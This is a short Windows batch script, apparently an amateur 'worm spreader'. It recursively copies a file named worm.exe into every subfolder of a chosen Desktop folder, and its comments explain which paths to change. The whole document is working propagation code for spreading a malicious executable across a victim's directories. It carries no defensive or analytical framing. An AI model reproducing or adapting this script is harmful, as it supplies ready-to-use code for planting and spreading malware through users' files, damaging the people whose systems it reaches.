@echo off
for /r "%USERPROFILE%\Desktop\LOL" %%i in (.) do @copy "%USERPROFILE%\Desktop\worm.exe" "%%i"

REM %USERPROFILE% = C:\Users\(usernamewouldbehere)\anything else in that directory

REM %USERPROFILE%\Desktop\LOL = the folder to be wormed

REM %USERPROFILE%\Desktop\worm.exe = the worm file